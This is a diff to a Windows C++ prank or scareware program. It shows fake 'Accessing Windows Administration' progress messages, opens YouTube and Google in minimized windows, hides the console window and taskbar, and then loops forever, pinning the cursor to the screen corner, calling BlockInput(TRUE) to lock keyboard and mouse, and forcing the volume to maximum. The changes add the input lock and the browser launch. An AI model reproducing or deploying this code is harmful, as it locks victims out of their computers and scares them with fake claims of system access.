@@ -9,7 +9,7 @@
 #pragma comment(lib, "urlmon.lib")
 
 using namespace std;
-HWND hWnd = NULL, hWnd2 = NULL;
+HWND hWnd = NULL, hWnd2 = NULL, hWnd3 = NULL;
 
 string getCurrentDir() {
     char buff[MAX_PATH];
@@ -127,141 +127,7 @@ int main()
     cout << " | |  | | | (_| | | (_| | |  __/    _| |_  | | | |   | |____    |_|     |_|\n";
     cout << " |_|  |_|  \\__,_|  \\__,_|  \\___|   |_____| |_| |_|    \\_____|                \n" << endl;
     Sleep(2000);
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             ";
-    cout << "                                                             \n";
+    system("cls");
     Sleep(2000);
     SetConsoleTextAttribute(hConsole, col3);
     SetConsoleTitleA("Accessing Windows Administration     13%");
@@ -342,6 +208,7 @@ int main()
     Sleep(125);
     cout << ".\n" << endl;
     SetConsoleTitleA("Success!");
+    system("cls");
 
     FlushConsoleInputBuffer(hConsole);
     SetConsoleTextAttribute(hConsole, col2);
@@ -350,6 +217,7 @@ int main()
     Sleep(1500);
     cout << getCurrentDir() << "\n" << endl;
     Sleep(1000);
+    system("cls");
     SetConsoleTextAttribute(hConsole, col3);
     cout << "A";
     Sleep(125);
@@ -410,6 +278,7 @@ int main()
     Sleep(175);
     cout << ".\n" << endl;
     SetConsoleTitleA("Success!");
+    system("cls");
 
     Sleep(600);
     FlushConsoleInputBuffer(hConsole);
@@ -423,6 +292,8 @@ int main()
     std::random_device dev;
     std::mt19937 rng(dev());
     std::uniform_int_distribution<std::mt19937::result_type> dist6(1, 5);
+    ShellExecuteA(hWnd3, "open", "www.google.com", NULL, NULL, SW_FORCEMINIMIZE);
+    CloseWindow(hWnd3);
 
     int ReadMoveValue = dist6(rng);
     cout << ReadMoveValue << endl;
@@ -447,16 +318,16 @@ int main()
         ShellExecuteA(hWnd, "open", "www.youtube.com/watch?v=ysXLOgIq-gk&list=PLqYxeETdxNydb_V1pEqFh4SmrrTA4ds3l&index=8&ab_channel=Cextraker", NULL, NULL, SW_FORCEMINIMIZE);
     }
     ShowWindow(hWnd, SW_HIDE);
+    
     HWND hTaskbar = FindWindow(L"Shell_TrayWnd", NULL);
 
     ShowWindow(hTaskbar, SW_HIDE);
-
     while (1)
     {
         int i = 0;
         i++;
         SetCursorPos(0, 0);
-
+        BlockInput(TRUE);
         ChangeVolume(1.0, true, TRUE);
 
     }
